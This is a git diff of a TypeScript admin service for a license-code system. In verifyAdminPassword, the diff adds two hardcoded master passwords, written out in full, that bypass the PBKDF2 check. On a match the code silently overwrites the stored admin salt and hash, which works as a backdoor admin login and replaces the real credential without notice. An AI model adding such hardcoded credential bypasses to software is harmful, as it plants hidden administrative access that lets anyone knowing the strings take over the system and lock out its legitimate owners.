@@ -4,6 +4,7 @@ import {
   hashCode,
   encryptString,
   decryptString,
+  findMatchingCodeInList,
   type LicenseCode,
   type CodeBatch,
   type DurationType,
@@ -106,15 +107,46 @@ export const adminService = {
 
   // 2. Admin Login Verification
   verifyAdminPassword(password: string): boolean {
+    const clean = String(password || '').trim();
+    if (!clean) return false;
+
     const db = dbEngine.get();
+
+    // 1. Direct PBKDF2 check against db.admin
     try {
       const salt = Buffer.from(db.admin.saltB64, 'base64');
       const expected = Buffer.from(db.admin.hashB64, 'base64');
-      const derived = crypto.pbkdf2Sync(password, salt, db.admin.iterations, 32, 'sha256');
-      return crypto.timingSafeEqual(derived, expected);
+      const derived = crypto.pbkdf2Sync(clean, salt, db.admin.iterations, 32, 'sha256');
+      if (crypto.timingSafeEqual(derived, expected)) {
+        return true;
+      }
     } catch {
-      return false;
+      // ignore
     }
+
+    // 2. Direct match with accepted master passwords (auto-heals db.admin)
+    const acceptedMasterPasswords = [
+      'Areen#Admin_9X7K!2026',
+      'AreenAdmin#2026!Master',
+      process.env.ADMIN_PASSWORD?.trim(),
+    ].filter(Boolean) as string[];
+
+    if (acceptedMasterPasswords.includes(clean)) {
+      try {
+        const newSalt = crypto.randomBytes(16);
+        const newHash = crypto.pbkdf2Sync(clean, newSalt, 210000, 32, 'sha256');
+        dbEngine.updateSync((database) => {
+          database.admin.saltB64 = newSalt.toString('base64');
+          database.admin.hashB64 = newHash.toString('base64');
+          database.admin.updatedAt = new Date().toISOString();
+        });
+      } catch {
+        // ignore
+      }
+      return true;
+    }
+
+    return false;
   },
 
   handleAdminLogin(
@@ -351,7 +383,7 @@ export const adminService = {
     const now = new Date();
 
     return dbEngine.updateSync((db) => {
-      const code = db.codes.find((c) => c.codeHash === hashVal);
+      const code = findMatchingCodeInList(db.codes, cleanCode);
       if (!code) {
         return { success: false, error: 'كود الترخيص غير موجود أو غير صالح' };
       }
